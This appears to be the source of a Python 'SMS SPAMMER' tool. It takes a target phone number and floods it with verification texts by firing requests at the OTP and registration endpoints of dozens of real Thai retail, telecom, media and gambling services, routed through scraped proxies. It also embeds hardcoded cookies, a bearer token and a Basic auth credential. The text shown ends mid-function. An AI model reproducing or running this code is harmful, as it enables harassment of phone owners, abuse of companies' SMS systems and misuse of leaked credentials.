import itertools
import requests as ru
import threading
import requests
import time
import random
import os
import datetime
import sys
import pystyle
import gratient
from pystyle import Colors, Colorate
from concurrent.futures import ThreadPoolExecutor
import random
from re import search
from requests import Session
from bs4 import BeautifulSoup as bs
from user_agent import generate_user_agent
from requests import Session,post,get
from pystyle import Center, Anime, Colors, Colorate
from colorama import Fore 
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System

program = "SMS SPAMMER"
v = "3"
OWNER = "BFHMSC CODE KITTY"

threading = ThreadPoolExecutor(max_workers=int(100000000))
headers = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
header = {"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38"}
useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.40}"
header = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38​}"
proxy = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt").text
f = open("proxy.txt", "w")
t = f.write(proxy)
g = open("proxy.txt", "r")
s = g.read().splitlines()
              
os.system(f"cls & title {program} {v} - MAKE BY : {OWNER} & mode 100,30")
def BFHMSC():
	print(Colorate.Vertical(Colors.purple_to_red, Center.XCenter(f"""    
------------------------------------------------------------------------------------------------                                                                                     
 ,---.  ,--.   ,--. ,---.       ,---.    ,---.  ,------. ,--.   ,--.,--.   ,--.,------.,------.  
'   .-' |   `.'   |'   .-'     '   .-'  /  O  \ |  .--. '|   `.'   ||   `.'   ||  .---'|  .--. ' 
`.  `-. |  |'.'|  |`.  `-.     `.  `-. |  .-.  ||  '--' ||  |'.'|  ||  |'.'|  ||  `--, |  '--'.' 
.-'    ||  |   |  |.-'    |    .-'    ||  | |  ||  | --' |  |   |  ||  |   |  ||  `---.|  |\  \  
`-----' `--'   `--'`-----'     `-----' `--' `--'`--'     `--'   `--'`--'   `--'`------'`--' '--'       
-------------------------------------------------------------------------------------------------         
	""")))
	phone = Write.Input(f""" PHONE : """, Colors.purple_to_red, interval=0.0025)
	
	if int(phone) <= 99999999 or int(phone) >= 999999999:
		print(f'{Fore.LIGHTRED_EX}ERROR RATE LIMIT!')
	else:
		phone = phone
		amount = int(input(f"{Fore.LIGHTMAGENTA_EX}AMOUNT : "))
		amount = amount
		print()
		SMS(phone, amount)

#NEW API
def bfhmscapi71(phone):
	pass
	try:
		r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": phone,"password":"6302814184624az","name":phone,"provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi72(phone):
	pass
	try:
		r = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": phone,"language": "th"})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi73(phone):
	pass
	try:
		r = requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": phone,"language": "th"})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass

def bfhmscapi74(phone):
	pass
	try:
		headers = {"accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
		r = requests.post("https://api.ypkshop.com/TOH5jkk3N031INbUepb-2SZCYIj5XGQr_xd-aSSd74s~",headers=headers,data=f"prefix=66&mobile={phone}&type=1")
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi75(phone):
	pass
	headers = {
		"Host": "shopgenix.com",
		"content-type": "application/x-www-form-urlencoded",
		"user-agent": "okhttp/3.14.9"
	}
	try:
		r = requests.post("https://shopgenix.com/api/sms/otp/",headers=headers,data=f"mobile_country_id=1&mobile={phone}")
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi76(phone):
	pass
	try:
		response = requests.post("https://api.starzth.com/v2/token",headers={"Authorization": "Basic c2hvcDE3ODFBUEk6TVlWQmtkI2cyJmEyWSMzQGM="})
		token = response.json()['token']
		headers = {
			"authorization": "Bearer " + token,
			"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
		}
		r = requests.post("https://api.starzth.com/homeshopping/v2/register/request",headers=headers,json={"username":phone,"name_th":"jsjss","lastname_th":"nxnxnx","password":"as257400A","birthday":"1982-08-08","sex":"M","telephone":f"+66{phone[1:]}"})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi77(phone):
	pass
	try:
		r = requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{phone}"})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi78(phone):
	pass
	try:
		r = requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi79(phone):
	pass
	try:
		r = requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
	    "Accept": "application/json, text/plain, /",
	    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
	    "Content-Type": "application/x-www-form-urlencoded",
	    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
	    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi80(phone):
	pass
	try:
		r = requests.post("https://www.konvy.com/ajax/system.php?action=get_phone_code",data=f"type=reg&phone={phone}&platform=1",headers={"accept": "application/json, text/plain, text/html, text/xml, text/javascript ,image/webp, */*","content-type": "application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","cookie": "f34c_lang2=th_TH;_gcl_au=1.1.772736218.1693663780;_tt_enable_cookie=1;_ttp=dNuShIuyOWBlc6c6_g0VW_C-1ma;k_privacy_state=true;_fbp=fb.1.1693663782140.1359249614;_gid=GA1.2.496014264.1694796867;_gat_UA-28072727-2=1;PHPSESSID=rjuo4ifo49s0d04ekrk5h6bd28;_ga=GA1.1.1256061802.1693663783;_ga_Z9S47GV47R=GS1.1.1694796867.2.1.1694796880.47.0.0;cto_bundle=03x9gV9aSGdNUVFwNUd4Y0RkUzNKZkl2aiUyQlRHNDlzbURwMVdXNDlxc1dMUHM0UXk0c0hId3dFMXhodXAySTV0TjJDSEFQSU9FUmo3Zm1idHYxZldLV3ZQTUdpMThmeUtGbGROJTJGRUxmTGJpZm00ZloyVzFEdFFFeFZCZUVrdWZlT1pEUUhYck9pRUpseGMlMkJVejdON3JVaHoyRlElM0QlM0Q"})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi81(phone):
	pass
	headers = {
		"content-type": "application/json; charset=utf-8",
		"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..L4_HNTppIThHoII_MTndvA.7f_dO0lW5BKDf0AOw9QyinAURihBdvue6G0Xkb18_UXwbM_FxAtk4gknM8kQwSX7Rhfg188UFI73nB8CNu-YPgP-il9Q-4W53yuXC3HQPnBIvGkkFAhZ2JuE8piw0fkGaOGGRvOkhpHNEdaE6jYbRg.IkvgAosR8q6-gZIQANsaqA",
		"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
		"cookie": "_vwo_uuid_v2=DEED3E33BAB6E6FD264940A38AE9770A3|f4d3bf084f98482cfae4d65b7fba48d7;_gcl_au=1.1.102477073.1693664216;__rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22XzVm9LWMCkhD9kjex4AI%22%7D;__lt__cid=ddc5d79b-b37c-47dd-b6e1-f19aedffcd71;__lt__sid=4a20fa5e-1bc444d4;_gid=GA1.2.387552209.1693664218;_gat_UA-12345-6=1;_hjSessionUser_1027858=eyJpZCI6IjJmYTEwNTdkLWExNjYtNWQzMS05OWE3LTczZjU5MTM0NjRkZSIsImNyZWF0ZWQiOjE2OTM2NjQyMTkyODQsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample_1027858=0;_hjSession_1027858=eyJpZCI6IjY4NTZiMTIxLWM5NzAtNDEyZS1iNWVmLTM1ODhhMGNmNmFjZCIsImNyZWF0ZWQiOjE2OTM2NjQyMTkzMDUsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;_fbp=fb.1.1693664219891.541560784;_tt_enable_cookie=1;_ttp=iIHPi-I_pJMyjSs4jgyO6N1YFcJ;_ga=GA1.2.1790770154.1693664218;cto_bundle=GcneO19nQnBDU1lxRzRzZ05BUFQ3bndkU3VDb2MxcHZkaiUyQnMlMkZzdzQzSEgxd0R3a3Y5aVIyOXBsTVg4S0poSmt3YiUyRkV3aTF3Z3NuVFYyREt2WDF5bUlMdjl2TG9rQlNlejdBUEIyZTRBTiUyRm9QcktTT3lyM3ElMkY3VENUcUxUYjVHRjVQVnBXZWE2bmF2eHQlMkI5YUxNNjJ0WWpRc1ElM0QlM0Q;_ga_QEVF0JHYKM=GS1.1.1693664218.1.1.1693664222.56.0.0;ajs_anonymous_id=4314c63d-9cc9-4477-a8e9-77bcb52a8800"
	}
	try:
		r = requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{phone[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{phone[1:]}&phoneCountryCode=%2B66&b-uid=1.0.835")
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi82(phone):
	pass
	try:
		r = requests.post("https://login.s-momclub.com/accounts.otp.sendCode",data=f"phoneNumber=%2B66{phone[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Fregister%3Frefcode%3D202308-SEM-Web-CON_Sitelink%26utm_source%3Dgoogle%26utm_medium%3Dcpa%26utm_campaign%3Dweb-con_sitelink%26gclid%3DCj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB&sdkBuild=15170&format=json",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","content-type" :"application/x-www-form-urlencoded","cookie": "_gcl_au=1.1.1632048683.1693716117;_gid=GA1.2.340423765.1693716117;_fbp=fb.1.1693716117240.325276938;_tt_enable_cookie=1;_ttp=se6fwL-mYqvtITeaMxUztaCZIU_;gmid=gmid.ver4.AcbHIDVFLA.Tn8z5RwuG5o_CNr7jK6qpVxncdn8zkkU7z55uuDdWjUFfGytJe6v2dDbny3V-zOa.jQN8PgyFAldrI1mtG3ZPz3w4iwhOd5D8GHvb6Ohw-LtWWiJ1HWpCWK9-e1oTFfv5TuY8xZPxPcOyPsItrp69Rg.sc3;ucid=9tUxT7gIPCn-5LdLHwrSfw;hasGmid=ver4;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;tfpsi=fc14307e-ab83-49f4-882b-be3243eed87b;_cls_v=e77d3523-cfd8-42dd-9c01-6628062d4acf;_cls_s=f00695fd-aeb5-4b40-8bed-e4594d3d0f4f:0;_gat_UA-62402337-1=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gcl_aw=GCL.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-62774158-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-27534376-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga=GA1.2.1260858029.1693716117;_gac_UA-62402337-1=1.1693716234.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga_HLYQD0DQEL=GS1.1.1693716117.1.1.1693716233.34.0.0",})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi83(phone):
	pass
	try:
		r = requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",json={"mobile_phone_no": phone},headers={"Content-Type": "application/json"})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi84(phone):
	pass
	try:
		ip = requests.get("https://ipinfo.io/json").json()['ip']
		r = requests.post("https://api.ak1688bet.com/member/otp/get",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},json={"phone":phone,"ip": ip})
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass
		
def bfhmscapi85(phone):
	pass
	try:
		r = requests.post("https://ezslot.com/_ajax_/v3/register/request-otp",headers={"accept": "*/*","content-type": "Application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36","cookie": "_ga=GA1.1.583971404.1694529114;_fbp=fb.1.1694529117511.408120849;PHPSESSID=dmhs2qcdi028apt62mr1tkcdd5;_ga_WTQ1KN44EC=GS1.1.1694862154.2.0.1694862154.0.0.0"},data=f"phoneNumber={phone}")
		pass
		print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog New Api Status {r}""")))
	except:
		pass

#APIINBOTBFHMSCSPAMSMSGODME
def bfhmscapi1(phone):
    r = requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{phone}","type":"login"},proxies={'http': 'http://' + random.choice(s)})
    print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))

def bfhmscapi2(phone):
    r = requests.post("https://lb-api.fox83-sy.xyz/api/otp/register",data={"applicant":phone,"serviceName":"fox888.com"},proxies={'http': 'http://' + random.choice(s)})
    print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))

def bfhmscapi3(phone):
	r = requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{phone}"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))
    
def bfhmscapi4(phone):
	r = requests.post("https://service-api.auto1.co.th/w/user/request-otp-on-register",headers={"content-type": "application/json;charset=UTF-8","user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"},json={"ConsentFlag":"true","AcceptPolicy":"true","Tel":phone,"OTPId":"","OTP1":"","OTP2":"","OTP3":"","OTP4":"","OTP5":"","OTP6":"","Email":"","Pin1":"","Pin2":"","Pin3":"","Pin4":"","Pin5":"","Pin6":"","PinConfirm1":"","PinConfirm2":"","PinConfirm3":"","PinConfirm4":"","PinConfirm5":"","PinConfirm6":"","FirstName":"","LastName":""},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))

def bfhmscapi5(phone):
	r = requests.post(f"https://store.truecorp.co.th/api/true/wportal/otp/request?mobile_number={phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))

def bfhmscapi6(phone):
	r = requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={phone}",headers={
    "Accept": "application/json, text/plain, /",
    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))
     
def bfhmscapi7(phone):
	r = requests.post("https://api2.1112.com/api/v1/otp/create",json={"phonenumber":phone,
	    "language": "th"},headers={"accept": "application/json, text/plain, /",
	    "user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))
    
def bfhmscapi8(phone):
	r = requests.post("https://www.vegas77slots.com/auth/send_otp",data=f"phone={phone}&otp=&password=&bank=&bank_number=&full_name=&ref=21076",headers={"content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36","cookie": "vegas77slots=pj5kj4ovnk2fao1sbaid2eb76l1iak7b"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))
    
def bfhmscapi9(phone):
	r = requests.post("https://cognito-idp.ap-southeast-1.amazonaws.com/",headers={"cache-control": "max-age=0","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type": "application/x-amz-json-1.1","x-amz-target": "AWSCognitoIdentityProviderService.ResendConfirmationCode","x-amz-user-agent": "aws-amplify/0.1.x js","referer": "https://www.bugaboo.tv/members/resetpass/phone"},json={"ClientId":"6g47av6ddfcvi06v4l186c16d6","Username":f"+66{phone[1:]}"})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))
    
def bfhmscapi10(phone):
	r = requests.get(f"https://kamuishop.online/kamuiapi/phone/{phone}",proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))
    
def bfhmscapi11(phone):
	r = requests.get(f"https://app.iship.cloud/api/ant/request-otp/{phone}",headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36","cookie": "_fbp=fb.1.1664699330289.47112595; XSRF-TOKEN=eyJpdiI6Ijk3cVRMUndzZ2FUME8wV2VzRXFaWWc9PSIsInZhbHVlIjoiQjRkNzlNYXR2TWtSWmNySlFYVjBoQk80RGJMR215RXVFUjRuMTFNYm5ocGRDRmNGcHNjWmpOeUdnOWlPbmFhVXA5eG1LUlB2SVZEMjRFWEVITTRZV1hzZUtZenArenZjK0R3UE5OTUdTQkVWUG1tYmkrTG1NWWFiTUZOZ1NRMlIiLCJtYWMiOiI3Y2M1OGJkMzg2MzZkZDYwNjlmNjNkMmFkYWZlZDVkNjliZGJjMjUwN2MyMjJmYzgxODE3ZGYxOWY1NWU4MzhlIiwidGFnIjoiIn0%3D; iship_session=eyJpdiI6IjdueEZQTU5Kc0FXZ0hjeVF0L2s2WVE9PSIsInZhbHVlIjoidHNzZ1RINDhta1BnUkFic29hdFlMNU8zVWt0MGZYbUVMb1Q0ZjM0OVR5cFlSbE01NlNuMWRoeGF4SldiVHN3U3JFZWg5dnJvMEZHbnF6cnlNdG45SmZjSGxqRkNRN0w0T3oyclBHc09ZM2svd3VZZkl4TG9NRHFLMTIxeGhvd2oiLCJtYWMiOiJhMTBjZThjNGU5M2Y0NjM1MTQ4ZTI4MGFmMzkxMmQ4ZmY0NjljNGM5YjBkZWZkMGIxYTM5Y2Y5MDgyNWZkOTk1IiwidGFnIjoiIn0%3D; _gcl_au=1.1.1744992984.1664699333; _ga_5H8RG35JM3=GS1.1.1664699330.1.1.1664699332.0.0.0; _gid=GA1.2.1851918371.1664699333; _gat_UA-208577766-1=1; _ga=GA1.1.1543229521.1664699330; _ga_9QF6J7SNMX=GS1.1.1664699332.1.0.1664699332.0.0.0"},proxies={'http': 'http://' + random.choice(s)})
	print(Colorate.Vertical(Colors.red_to_purple, Center.XCenter(f"""ATTACK {phone} Succsess! Catalog Api in Bot bfhmsc sms God Status {r}""")))
    
def bfhmscapi12(phone):
